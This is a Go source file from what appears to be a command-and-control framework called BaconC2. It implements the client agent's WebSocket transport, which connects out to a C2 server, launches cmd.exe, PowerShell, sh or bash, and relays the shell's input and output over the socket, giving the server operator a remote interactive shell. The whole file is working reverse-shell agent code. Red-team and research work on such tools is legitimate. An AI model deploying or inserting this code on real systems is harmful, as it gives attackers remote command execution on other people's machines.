package transport

import (
	"context"
	"fmt"
	"log"
	"os/exec"
	"runtime"
	"sync"

	"github.com/RabbITCybErSeC/BaconC2/client/models"
	"github.com/gorilla/websocket"
)

const (
	wsShellPath = "%s/ws/api/agents/shell?id=%s"
)

type WebSocketTransport struct {
	serverURL string
	agentID   string
	conn      *websocket.Conn
	ctx       context.Context
	cancel    context.CancelFunc
	mutex     sync.Mutex
}

func NewWebSocketTransport(serverURL, agentID string) models.IStreamingTransport {
	ctx, cancel := context.WithCancel(context.Background())
	return &WebSocketTransport{
		serverURL: serverURL,
		agentID:   agentID,
		ctx:       ctx,
		cancel:    cancel,
	}
}

func (t *WebSocketTransport) StartStreamingSession(sessionType string, config map[string]interface{}, resultChan chan<- models.CommandResult) error {
	if sessionType != "shell" {
		err := fmt.Errorf("unsupported session type: %s", sessionType)
		resultChan <- models.CommandResult{
			ID:     "session_start",
			Status: "error",
			Output: map[string]string{"error": err.Error()},
		}
		return err
	}

	shellType, _ := config["shell_type"].(string)
	if shellType == "" {
		shellType = "cmd" // Default
	}

	wsURL := fmt.Sprintf(wsShellPath, t.serverURL, t.agentID)
	conn, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
	if err != nil {
		resultChan <- models.CommandResult{
			ID:     "session_start",
			Status: "error",
			Output: map[string]string{"error": fmt.Sprintf("Failed to connect to WebSocket: %v", err)},
		}
		return fmt.Errorf("failed to connect to WebSocket: %w", err)
	}

	t.mutex.Lock()
	t.conn = conn
	t.mutex.Unlock()

	cmd, err := startShellProcess(shellType)
	if err != nil {
		t.CloseSession("shell")
		resultChan <- models.CommandResult{
			ID:     "session_start",
			Status: "error",
			Output: map[string]string{"error": fmt.Sprintf("Failed to start shell: %v", err)},
		}
		return fmt.Errorf("failed to start shell: %w", err)
	}

	go t.handleShellSession(cmd, resultChan)

	resultChan <- models.CommandResult{
		ID:     "session_start",
		Status: "success",
		Output: map[string]string{"message": "Shell session started"},
	}
	return nil
}

func (t *WebSocketTransport) CloseSession(sessionID string) error {
	t.mutex.Lock()
	defer t.mutex.Unlock()
	t.cancel()
	if t.conn != nil {
		err := t.conn.Close()
		t.conn = nil
		return err
	}
	return nil
}

func (t *WebSocketTransport) handleShellSession(cmd *exec.Cmd, resultChan chan<- models.CommandResult) {
	defer t.CloseSession("shell")
	defer cmd.Wait()

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Printf("Failed to get stdout pipe: %v", err)
		return
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		log.Printf("Failed to get stderr pipe: %v", err)
		return
	}
	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Printf("Failed to get stdin pipe: %v", err)
		return
	}

	if err := cmd.Start(); err != nil {
		log.Printf("Failed to start shell process: %v", err)
		return
	}

	// Read shell stdout
	go func() {
		buf := make([]byte, 1024)
		for {
			select {
			case <-t.ctx.Done():
				return
			default:
				n, err := stdout.Read(buf)
				if err != nil {
					log.Printf("Error reading stdout: %v", err)
					return
				}
				t.sendMessage(models.WebSocketMessage{
					Type: "output",
					Data: string(buf[:n]),
				})
			}
		}
	}()

	// Read shell stderr
	go func() {
		buf := make([]byte, 1024)
		for {
			select {
			case <-t.ctx.Done():
				return
			default:
				n, err := stderr.Read(buf)
				if err != nil {
					log.Printf("Error reading stderr: %v", err)
					return
				}
				t.sendMessage(models.WebSocketMessage{
					Type: "error",
					Data: string(buf[:n]),
				})
			}
		}
	}()

	// Read WebSocket messages
	for {
		select {
		case <-t.ctx.Done():
			return
		default:
			var msg models.WebSocketMessage
			t.mutex.Lock()
			if t.conn == nil {
				t.mutex.Unlock()
				return
			}
			err := t.conn.ReadJSON(&msg)
			t.mutex.Unlock()
			if err != nil {
				log.Printf("WebSocket read error: %v", err)
				return
			}
			if msg.Type == "input" {
				if _, err := stdin.Write([]byte(msg.Data)); err != nil {
					log.Printf("Error writing to shell stdin: %v", err)
					return
				}
			} else if msg.Type == "control" && msg.Data == "terminate" {
				return
			}
		}
	}
}

func (t *WebSocketTransport) sendMessage(msg models.WebSocketMessage) error {
	t.mutex.Lock()
	defer t.mutex.Unlock()
	if t.conn == nil {
		return fmt.Errorf("no WebSocket connection")
	}
	return t.conn.WriteJSON(msg)
}

func startShellProcess(shellType string) (*exec.Cmd, error) {
	if runtime.GOOS == "windows" {
		switch shellType {
		case "powershell":
			return exec.Command("powershell.exe"), nil
		default:
			return exec.Command("cmd.exe"), nil
		}
	} else {
		// Simplified; use github.com/creack/pty for full PTY support
		cmd := exec.Command("/bin/sh")
		if shellType == "bash" {
			cmd = exec.Command("/bin/bash")
		}
		return cmd, nil
	}
}
